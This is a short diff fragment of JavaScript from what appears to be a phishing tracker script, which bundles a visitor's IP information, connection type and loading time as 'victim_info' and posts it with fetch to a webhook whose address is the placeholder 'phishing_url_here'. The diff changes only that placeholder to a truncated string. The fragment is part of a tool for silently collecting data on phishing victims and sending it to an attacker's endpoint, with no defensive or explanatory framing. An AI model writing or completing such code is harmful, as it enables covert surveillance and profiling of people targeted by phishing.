@@ -90,7 +90,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "phishing_url_here"
+                const webhookURL = "phishing_url_he"
                 const payload = {'victim_info': ipinfo};
 
                 fetch(webhookURL, {
